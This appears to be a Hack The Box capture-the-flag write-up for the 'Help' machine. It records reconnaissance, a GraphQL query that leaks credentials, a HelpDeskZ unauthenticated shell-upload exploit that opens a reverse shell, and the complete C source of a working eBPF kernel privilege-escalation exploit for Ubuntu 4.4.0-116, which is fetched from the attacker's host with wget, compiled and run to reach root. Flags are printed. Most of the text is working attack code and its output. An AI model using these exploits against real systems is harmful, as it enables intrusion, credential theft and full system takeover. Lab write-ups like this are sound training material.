# [Access] - [HTB]
**Difficulty:** [Easy]  
**OS:** [Linux]  
**Date:** [06/09/2025]  
**Machine Type:** [Mixed]

---

## 1. Summary
- **Objective:** [X] Capture user flag  
- **Objective:** [X] Capture root flag / administrator access  
- **Description / Notes:** [Brief overview of the machine, main services, challenges]  
- **Skills Practiced:** 
  - [ ] Enumeration
  - [ ] Web Exploitation
  - [ ] Binary Exploitation
  - [ ] Privilege Escalation
  - [ ] Reverse Engineering
  - [ ] Pivoting / Networking
  - [ ] Others: _________

---

## 2. Recon & Enumeration

### 2.1 Network Scanning
```bash
# Nmap Quick Scan
┌──(sabeshan㉿kali)-[~]
└─$ nmap -sS -A -sV -T4 10.10.10.121 -vv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-06 12:41 IST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:41
Completed NSE at 12:41, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:41
Completed NSE at 12:41, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:41
Completed NSE at 12:41, 0.00s elapsed
Initiating Ping Scan at 12:41
Scanning 10.10.10.121 [4 ports]
Completed Ping Scan at 12:41, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:41
Completed Parallel DNS resolution of 1 host. at 12:41, 0.06s elapsed
Initiating SYN Stealth Scan at 12:41
Scanning 10.10.10.121 [1000 ports]
Discovered open port 22/tcp on 10.10.10.121
Discovered open port 80/tcp on 10.10.10.121
Discovered open port 3000/tcp on 10.10.10.121
Completed SYN Stealth Scan at 12:41, 4.29s elapsed (1000 total ports)
Initiating Service scan at 12:41
Scanning 3 services on 10.10.10.121
Completed Service scan at 12:41, 11.74s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.10.121
Initiating Traceroute at 12:41
Completed Traceroute at 12:41, 0.25s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 12:41
Completed Parallel DNS resolution of 2 hosts. at 12:41, 6.59s elapsed
NSE: Script scanning 10.10.10.121.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:41
Completed NSE at 12:41, 6.29s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:41
Completed NSE at 12:41, 0.86s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:41
Completed NSE at 12:41, 0.00s elapsed
Nmap scan report for 10.10.10.121
Host is up, received echo-reply ttl 63 (0.23s latency).
Scanned at 2025-09-06 12:41:23 IST for 33s
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZY4jlvWqpdi8bJPUnSkjWmz92KRwr2G6xCttorHM8Rq2eCEAe1ALqpgU44L3potYUZvaJuEIsBVUSPlsKv+ds8nS7Mva9e9ztlad/fzBlyBpkiYxty+peoIzn4lUNSadPLtYH6khzN2PwEJYtM/b6BLlAAY5mDsSF0Cz3wsPbnu87fNdd7WO0PKsqRtHpokjkJ22uYJoDSAM06D7uBuegMK/sWTVtrsDakb1Tb6H8+D0y6ZQoE7XyHSqD0OABV3ON39GzLBOnob4Gq8aegKBMa3hT/Xx9Iac6t5neiIABnG4UP03gm207oGIFHvlElGUR809Q9qCJ0nZsup4bNqa/
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHINVMyTivG0LmhaVZxiIESQuWxvN2jt87kYiuPY2jyaPBD4DEt8e/1kN/4GMWj1b3FE7e8nxCL4PF/lR9XjEis=
|   256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHxDPln3rCQj04xFAKyecXJaANrW3MBZJmbhtL4SuDYX
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://help.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/6%OT=22%CT=1%CU=34486%PV=Y%DS=2%DC=T%G=Y%TM=68BBDEBC
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M577ST11NW7%O2=M577ST11NW7%O3=M577NNT11NW7%O4=M577ST11NW7%O5=M577ST11
OS:NW7%O6=M577ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M577NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 19.182 days (since Mon Aug 18 08:20:07 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   245.36 ms 10.10.14.1
2   237.27 ms 10.10.10.121

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:41
Completed NSE at 12:41, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:41
Completed NSE at 12:41, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:41
Completed NSE at 12:41, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.99 seconds
           Raw packets sent: 1297 (57.902KB) | Rcvd: 1038 (42.254KB)
```
-------------------------------------------------------------------------------------------------------------
I do the directory search with the domain.
```bash
                                                                                                                                       
┌──(sabeshan㉿kali)-[~]
└─$ ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://help.htb/ -H "Host: FUZZ.help.htb" -fw 18

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://help.htb/
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.help.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 18
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 33 req/sec :: Duration: [0:00:40] :: Errors: 0 ::
                                                                                                                                       
┌──(sabeshan㉿kali)-[~]
└─$ dirsearch -u http://help.htb/     
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                       
 (_||| _) (/_(_|| (_| )                                                                                                                
                                                                                                                                       
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/sabeshan/reports/http_help.htb/__25-09-06_13-12-58.txt

Target: http://help.htb/

[13:12:58] Starting:                                                                                                                   
[13:13:11] 403 -  294B  - /.ht_wsr.txt                                      
[13:13:11] 403 -  297B  - /.htaccess.orig                                   
[13:13:11] 403 -  297B  - /.htaccess.bak1                                   
[13:13:11] 403 -  298B  - /.htaccess_extra
[13:13:11] 403 -  297B  - /.htaccess_orig
[13:13:11] 403 -  297B  - /.htaccess.save                                   
[13:13:11] 403 -  299B  - /.htaccess.sample
[13:13:11] 403 -  296B  - /.htaccessOLD2                                    
[13:13:11] 403 -  295B  - /.htaccessBAK
[13:13:11] 403 -  295B  - /.htaccess_sc
[13:13:11] 403 -  295B  - /.htaccessOLD
[13:13:11] 403 -  287B  - /.htm
[13:13:11] 403 -  288B  - /.html                                            
[13:13:11] 403 -  297B  - /.htpasswd_test                                   
[13:13:11] 403 -  293B  - /.htpasswds                                       
[13:13:11] 403 -  294B  - /.httr-oauth                                      
[13:13:14] 403 -  287B  - /.php                                             
[13:13:14] 403 -  288B  - /.php3                                            
[13:14:18] 301 -  309B  - /javascript  ->  http://help.htb/javascript/      
[13:14:47] 403 -  296B  - /server-status                                    
[13:14:47] 403 -  297B  - /server-status/                                   
[13:14:55] 301 -  306B  - /support  ->  http://help.htb/support/            
[13:14:55] 200 -    1KB - /support/
```
------------------------------------------------------------------------------------------------------------------
I used enumerate user credentials with the http://help.htb:3000/ and grapql parameter i obtain this thing from that
```bash
┌──(sabeshan㉿kali)-[~]
└─$ curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username,password} }' | jq
{
  "data": {
    "user": {
      "username": "helpme@helpme.com",
      "password": "5d3c93182bb20f07b994a7f617e99cff" --> godhelpmeplz
    }
  }
}
 ```
--------------------------------------------------------------------------------------------------------------------
https://github.com/ViktorNova/HelpDeskZ/tree/master/uploads/tickets - after the login there is software running on the machine with this github page
you can able to check the vulnerable upload.
or we can use contionuous enumeration
```bash
┌──(sabeshan㉿kali)-[~]
└─$ dirsearch -u http://help.htb/support
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/sabeshan/reports/http_help.htb/_support_25-09-06_15-15-02.txt

Target: http://help.htb/

[15:15:02] Starting: support/
[15:15:25] 301 -  309B  - /support/js  ->  http://help.htb/support/js/      
[15:15:30] 200 -  378B  - /support/.gitattributes                           
[15:15:31] 403 -  302B  - /support/.ht_wsr.txt                              
[15:15:31] 403 -  305B  - /support/.htaccess.orig                           
[15:15:31] 403 -  307B  - /support/.htaccess.sample
[15:15:31] 403 -  305B  - /support/.htaccess.bak1
[15:15:31] 403 -  305B  - /support/.htaccess.save                           
[15:15:31] 403 -  303B  - /support/.htaccessOLD                             
[15:15:31] 403 -  306B  - /support/.htaccess_extra                          
[15:15:31] 403 -  304B  - /support/.htaccessOLD2
[15:15:31] 403 -  303B  - /support/.htaccessBAK                             
[15:15:31] 403 -  303B  - /support/.htaccess_sc                             
[15:15:31] 403 -  305B  - /support/.htaccess_orig
[15:15:31] 403 -  302B  - /support/.httr-oauth                              
[15:15:31] 403 -  296B  - /support/.html                                    
[15:15:31] 403 -  301B  - /support/.htpasswds
[15:15:31] 403 -  305B  - /support/.htpasswd_test                           
[15:15:31] 403 -  295B  - /support/.htm                                     
[15:15:35] 403 -  295B  - /support/.php                                     
[15:15:35] 403 -  296B  - /support/.php3                                    
[15:16:30] 302 -    0B  - /support/controllers/  ->  /                      
[15:16:32] 301 -  310B  - /support/css  ->  http://help.htb/support/css/    
[15:16:43] 200 -    1KB - /support/favicon.ico                              
[15:16:53] 200 -    0B  - /support/images/                                  
[15:16:53] 301 -  313B  - /support/images  ->  http://help.htb/support/images/
[15:16:54] 302 -    0B  - /support/includes/  ->  /                         
[15:16:54] 301 -  315B  - /support/includes  ->  http://help.htb/support/includes/
[15:16:59] 301 -  317B  - /support/js/tinymce  ->  http://help.htb/support/js/tinymce/
[15:16:59] 302 -    0B  - /support/js/  ->  /                               
[15:16:59] 302 -    0B  - /support/js/tinymce/  ->  /                       
[15:17:02] 200 -    7KB - /support/LICENSE.txt                              
[15:17:37] 200 -    3KB - /support/readme.html                              
[15:17:37] 200 -    3KB - /support/README.md
[15:18:11] 301 -  314B  - /support/uploads  ->  http://help.htb/support/uploads/
[15:18:12] 302 -    0B  - /support/uploads/  ->  /                          
[15:18:15] 301 -  312B  - /support/views  ->  http://help.htb/support/views/
```
--------------------------------------------------------------------------------------------------------
I find the weak file upload system in the ticket submiting and i used it gain the reverse shell
```bash
┌──(myenv)─(sabeshan㉿kali)-[~/HTB/OSCP/help]
└─$ python 40300.py http://help.htb/support/uploads/tickets/ php_rev_shell.php                                          
Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
found!
http://help.htb/support/uploads/tickets/2c1fa579299593fc1444f2487837f6fc.php
                                                                                                                                       
┌──(myenv)─(sabeshan㉿kali)-[~/HTB/OSCP/help]
└─$ curl http://help.htb/support/uploads/tickets/2c1fa579299593fc1444f2487837f6fc.php
```
----------------------------------------------------------------------------------------------------------
I got the user shell and I'm looking for root then I got the kernal os exploit.
```bash
┌──(sabeshan㉿kali)-[~]
└─$ nc -lvnp 1337                       
listening on [any] 1337 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.121] 54598
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 03:06:21 up  2:55,  0 users,  load average: 0.01, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
bash: cannot set terminal process group (757): Inappropriate ioctl for device
bash: no job control in this shell
help@help:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
help@help:/$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                                                                                             
┌──(sabeshan㉿kali)-[~]
└─$ stty raw -echo; fg          
[1]  + continued  nc -lvnp 1337

help@help:/$ ls
bin   etc         initrd.img.old  lost+found  opt   run   sys  var
boot  home        lib             media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
help@help:/$ cd /home
help@help:/home$ ls 
help
help@help:/home$ cd help
help@help:/home/help$ ls -la
total 60
drwxr-xr-x   7 help help  4096 Dec 18  2023 .
drwxr-xr-x   3 root root  4096 Dec 13  2023 ..
lrwxrwxrwx   1 root root     9 Dec 18  2023 .bash_history -> /dev/null
-rw-r--r--   1 help help   220 Nov 27  2018 .bash_logout
-rw-r--r--   1 help help     1 Nov 27  2018 .bash_profile
-rw-r--r--   1 help help  3771 Nov 27  2018 .bashrc
drwx------   2 help help  4096 Nov 23  2021 .cache
drwxr-xr-x   4 help help  4096 Dec 13  2023 .forever
drwxrwxr-x   2 help help  4096 Nov 23  2021 .nano
drwxrwxr-x 290 help help 12288 Dec 13  2023 .npm
-rw-r--r--   1 help help   655 Nov 27  2018 .profile
drwxrwxrwx   6 help help  4096 May  4  2022 help
-rw-rw-r--   1 help help     1 May  4  2022 npm-debug.log
-rw-r--r--   1 help help    33 Sep  6 00:11 user.txt
help@help:/home/help$ cat user.txt
db8f0d4d507807bab87d1fc415ac4b52
help@help:/home/help$     
help@help:/home/help$ 
help@help:/home/help$ 
help@help:/home/help$ 
help@help:/home/help$ uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
-----------------------------------------------------------------
There is kernal exploit is available here
```bash
/*
 * Ubuntu 16.04.4 kernel priv esc
 *
 * all credits to @bleidl
 * - vnik
 */

// Tested on:
// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64
// if different kernel adjust CRED offset + check kernel stack size
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <linux/bpf.h>
#include <linux/unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <stdint.h>

#define PHYS_OFFSET 0xffff880000000000
#define CRED_OFFSET 0x5f8
#define UID_OFFSET 4
#define LOG_BUF_SIZE 65536
#define PROGSIZE 328

int sockets[2];
int mapfd, progfd;

char *__prog = 	"\xb4\x09\x00\x00\xff\xff\xff\xff"
		"\x55\x09\x02\x00\xff\xff\xff\xff"
		"\xb7\x00\x00\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x18\x19\x00\x00\x03\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00"
		"\xbf\x91\x00\x00\x00\x00\x00\x00"
		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
		"\x07\x02\x00\x00\xfc\xff\xff\xff"
		"\x62\x0a\xfc\xff\x00\x00\x00\x00"
		"\x85\x00\x00\x00\x01\x00\x00\x00"
		"\x55\x00\x01\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x79\x06\x00\x00\x00\x00\x00\x00"
		"\xbf\x91\x00\x00\x00\x00\x00\x00"
		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
		"\x07\x02\x00\x00\xfc\xff\xff\xff"
		"\x62\x0a\xfc\xff\x01\x00\x00\x00"
		"\x85\x00\x00\x00\x01\x00\x00\x00"
		"\x55\x00\x01\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x79\x07\x00\x00\x00\x00\x00\x00"
		"\xbf\x91\x00\x00\x00\x00\x00\x00"
		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
		"\x07\x02\x00\x00\xfc\xff\xff\xff"
		"\x62\x0a\xfc\xff\x02\x00\x00\x00"
		"\x85\x00\x00\x00\x01\x00\x00\x00"
		"\x55\x00\x01\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x79\x08\x00\x00\x00\x00\x00\x00"
		"\xbf\x02\x00\x00\x00\x00\x00\x00"
		"\xb7\x00\x00\x00\x00\x00\x00\x00"
		"\x55\x06\x03\x00\x00\x00\x00\x00"
		"\x79\x73\x00\x00\x00\x00\x00\x00"
		"\x7b\x32\x00\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x55\x06\x02\x00\x01\x00\x00\x00"
		"\x7b\xa2\x00\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x7b\x87\x00\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00";

char bpf_log_buf[LOG_BUF_SIZE];

static int bpf_prog_load(enum bpf_prog_type prog_type,
		  const struct bpf_insn *insns, int prog_len,
		  const char *license, int kern_version) {
	union bpf_attr attr = {
		.prog_type = prog_type,
		.insns = (__u64)insns,
		.insn_cnt = prog_len / sizeof(struct bpf_insn),
		.license = (__u64)license,
		.log_buf = (__u64)bpf_log_buf,
		.log_size = LOG_BUF_SIZE,
		.log_level = 1,
	};

	attr.kern_version = kern_version;

	bpf_log_buf[0] = 0;

	return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}

static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
		   int max_entries) {
	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries
	};

	return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_elem(uint64_t key, uint64_t value) {
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (__u64)&key,
		.value = (__u64)&value,
		.flags = 0,
	};

	return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

static int bpf_lookup_elem(void *key, void *value) {
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (__u64)key,
		.value = (__u64)value,
	};

	return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

static void __exit(char *err) {
	fprintf(stderr, "error: %s\n", err);
	exit(-1);
}

static void prep(void) {
	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);
	if (mapfd < 0)
		__exit(strerror(errno));

	progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
			(struct bpf_insn *)__prog, PROGSIZE, "GPL", 0);

	if (progfd < 0)
		__exit(strerror(errno));

	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
		__exit(strerror(errno));

	if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0)
		__exit(strerror(errno));
}

static void writemsg(void) {
	char buffer[64];

	ssize_t n = write(sockets[0], buffer, sizeof(buffer));

	if (n < 0) {
		perror("write");
		return;
	}
	if (n != sizeof(buffer))
		fprintf(stderr, "short write: %lu\n", n);
}

#define __update_elem(a, b, c) \
	bpf_update_elem(0, (a)); \
	bpf_update_elem(1, (b)); \
	bpf_update_elem(2, (c)); \
	writemsg();

static uint64_t get_value(int key) {
	uint64_t value;

	if (bpf_lookup_elem(&key, &value))
		__exit(strerror(errno));

	return value;
}

static uint64_t __get_fp(void) {
	__update_elem(1, 0, 0);

	return get_value(2);
}

static uint64_t __read(uint64_t addr) {
	__update_elem(0, addr, 0);

	return get_value(2);
}

static void __write(uint64_t addr, uint64_t val) {
	__update_elem(2, addr, val);
}

static uint64_t get_sp(uint64_t addr) {
	return addr & ~(0x4000 - 1);
}

static void pwn(void) {
	uint64_t fp, sp, task_struct, credptr, uidptr;

	fp = __get_fp();
	if (fp < PHYS_OFFSET)
		__exit("bogus fp");
	
	sp = get_sp(fp);
	if (sp < PHYS_OFFSET)
		__exit("bogus sp");
	
	task_struct = __read(sp);

	if (task_struct < PHYS_OFFSET)
		__exit("bogus task ptr");

	printf("task_struct = %lx\n", task_struct);

	credptr = __read(task_struct + CRED_OFFSET); // cred

	if (credptr < PHYS_OFFSET)
		__exit("bogus cred ptr");

	uidptr = credptr + UID_OFFSET; // uid
	if (uidptr < PHYS_OFFSET)
		__exit("bogus uid ptr");

	printf("uidptr = %lx\n", uidptr);
	__write(uidptr, 0); // set both uid and gid to 0

	if (getuid() == 0) {
		printf("spawning root shell\n");
		system("/bin/bash");
		exit(0);
	}

	__exit("not vulnerable?");
}

int main(int argc, char **argv) {
	prep();
	pwn();

	return 0;
}
```
----------------------------------------------------------------------------------------------------
I rooted the box
```bash
help@help:/home/help$ wget http://10.10.14.18:8000/exploit 
--2025-09-06 03:16:38--  http://10.10.14.18:8000/exploit
Connecting to 10.10.14.18:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17216 (17K) [application/octet-stream]
Saving to: 'exploit'

exploit             100%[===================>]  16.81K  56.4KB/s    in 0.3s    

2025-09-06 03:16:39 (56.4 KB/s) - 'exploit' saved [17216/17216]

help@help:/home/help$ chmod +x exploit
help@help:/home/help$ ./exploit
./exploit: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exploit)
help@help:/home/help$ cp ./exploit /tmp
help@help:/home/help$ cd /tmp
help@help:/tmp$ chmod +x exploit
help@help:/tmp$ ./exploit
./exploit: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exploit)
help@help:/tmp$ rm -rf exploit
help@help:/tmp$ wget http://10.10.14.18:8000/exploit
--2025-09-06 03:25:44--  http://10.10.14.18:8000/exploit
Connecting to 10.10.14.18:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17216 (17K) [application/octet-stream]
Saving to: 'exploit'

exploit             100%[===================>]  16.81K  52.8KB/s    in 0.3s    

2025-09-06 03:25:45 (52.8 KB/s) - 'exploit' saved [17216/17216]

help@help:/tmp$ chmod +x exploit
help@help:/tmp$ ./exploit
./exploit: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exploit)
help@help:/tmp$ ls -la
total 56
drwxrwxrwt  9 root root  4096 Sep  6 03:25 .
drwxr-xr-x 22 root root  4096 May  4  2022 ..
drwxrwxrwt  2 root root  4096 Sep  6 00:11 .ICE-unix
drwxrwxrwt  2 root root  4096 Sep  6 00:11 .Test-unix
drwxrwxrwt  2 root root  4096 Sep  6 00:11 .X11-unix
drwxrwxrwt  2 root root  4096 Sep  6 00:11 .XIM-unix
drwxrwxrwt  2 root root  4096 Sep  6 00:11 .font-unix
drwxrwxrwt  2 root root  4096 Sep  6 00:11 VMwareDnD
-rwxrwxrwx  1 help help 17216 Sep  6 03:24 exploit
drwx------  3 root root  4096 Sep  6 00:11 systemd-private-ac949f4149ca46f9a2a24cab2af6d0ef-systemd-timesyncd.service-F7jB0f
help@help:/tmp$ id
uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
help@help:/tmp$ sudo -l
[sudo] password for help: 
help@help:/tmp$ find / -perm 4000 -type f 2>/dev/null
help@help:/tmp$ ./exploit
./exploit: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exploit)
help@help:/tmp$ file exploit
exploit: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5037281f09230df7eb87d80ebc217e6d1bcec0eb, for GNU/Linux 3.2.0, not stripped
help@help:/tmp$ rm -rf exploit
help@help:/tmp$ wget http://10.10.14.18:8000/exploit 
--2025-09-06 03:32:04--  http://10.10.14.18:8000/exploit
Connecting to 10.10.14.18:8000... failed: Connection refused.
help@help:/tmp$ wget http://10.10.14.18:8000/exploit
--2025-09-06 03:32:20--  http://10.10.14.18:8000/exploit
Connecting to 10.10.14.18:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17216 (17K) [application/octet-stream]
Saving to: 'exploit'

exploit             100%[===================>]  16.81K  55.9KB/s    in 0.3s    

2025-09-06 03:32:21 (55.9 KB/s) - 'exploit' saved [17216/17216]

help@help:/tmp$ ls -la
total 56
drwxrwxrwt  9 root root  4096 Sep  6 03:32 .
drwxr-xr-x 22 root root  4096 May  4  2022 ..
drwxrwxrwt  2 root root  4096 Sep  6 00:11 .ICE-unix
drwxrwxrwt  2 root root  4096 Sep  6 00:11 .Test-unix
drwxrwxrwt  2 root root  4096 Sep  6 00:11 .X11-unix
drwxrwxrwt  2 root root  4096 Sep  6 00:11 .XIM-unix
drwxrwxrwt  2 root root  4096 Sep  6 00:11 .font-unix
drwxrwxrwt  2 root root  4096 Sep  6 00:11 VMwareDnD
-rw-rw-rw-  1 help help 17216 Sep  6 03:31 exploit
drwx------  3 root root  4096 Sep  6 00:11 systemd-private-ac949f4149ca46f9a2a24cab2af6d0ef-systemd-timesyncd.service-F7jB0f
help@help:/tmp$ chmod +x exploit
help@help:/tmp$ ./exploit
./exploit: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exploit)
help@help:/tmp$ LD_LIBRARY_PATH=/opt/glibc-2.34/lib ./exploit
./exploit: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exploit)
help@help:/tmp$ rm -rf
help@help:/tmp$ wget http://10.10.14.18:8000/exploit.c
--2025-09-06 03:35:47--  http://10.10.14.18:8000/exploit.c
Connecting to 10.10.14.18:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5776 (5.6K) [text/x-csrc]
Saving to: 'exploit.c'

exploit.c           100%[===================>]   5.64K  --.-KB/s    in 0.009s  

2025-09-06 03:35:48 (626 KB/s) - 'exploit.c' saved [5776/5776]

help@help:/tmp$ gcc exploit.c -o exploit
help@help:/tmp$ ./exploit
task_struct = ffff88003b92b800
uidptr = ffff88003737e604
spawning root shell
root@help:/tmp#  cat /root/root.txt
39a2951a28e774a6e04caae084d1c3e6
root@help:/tmp# 
```
-------------------------------------------------------------------------------------------------------------

